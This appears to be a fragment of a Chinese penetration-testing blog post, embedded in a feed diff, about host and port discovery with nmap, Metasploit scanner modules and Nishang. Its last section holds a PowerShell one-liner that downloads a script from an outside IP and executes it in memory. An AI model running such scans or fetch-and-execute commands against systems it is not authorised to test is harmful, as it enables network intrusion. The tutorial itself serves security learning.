+<h4 id="2-ICMP协议探测"><a href="#2-ICMP协议探测" class="headerlink" title="2.  ICMP协议探测"></a>2.  ICMP协议探测</h4><p>ICMP是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否 可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要 的作用。</p>
+<h6 id="nmap扫描-1"><a href="#nmap扫描-1" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sn -PE -T4 <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">#  -sn: <span class="built_in">Ping</span> Scan - disable port scan</span><br><span class="line">#  -PE: ICMP <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-UDP协议探测"><a href="#3-UDP协议探测" class="headerlink" title="3.  UDP协议探测"></a>3.  UDP协议探测</h4><p>UDP是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供 数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p>
+<h6 id="nmap扫描-2"><a href="#nmap扫描-2" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sU –T4 -sV --max-retries <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">100</span> -p <span class="number">500</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="msf扫描-1"><a href="#msf扫描-1" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-ARP协议探测"><a href="#4-ARP协议探测" class="headerlink" title="4.  ARP协议探测"></a>4.  ARP协议探测</h4><p>ARP,通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取 物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回 消息，以此确定目标的物理地址</p>
+<h6 id="nmap扫描-3"><a href="#nmap扫描-3" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sn -PR <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="msf扫描-2"><a href="#msf扫描-2" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-SMB协议探测"><a href="#5-SMB协议探测" class="headerlink" title="5.  SMB协议探测"></a>5.  SMB协议探测</h4><h6 id="msf扫描-3"><a href="#msf扫描-3" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-端口探测"><a href="#6-端口探测" class="headerlink" title="6.  端口探测"></a>6.  端口探测</h4><p>MSF中的portscan模块 </p>
+<p>nmap </p>
+<p>Nishang中的Invoke-PortScan模块 端口扫描，默认扫描常见端口，也可以用 -Port指定端口： </p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell iex(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.<span class="number">104</span>.<span class="number">255</span>.<span class="number">11</span>:<span class="number">8000</span>/Invoke-PortScan.ps1&#x27;);InvokePortScan -StartAddress <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">1</span> -EndAddress <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">255</span> -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
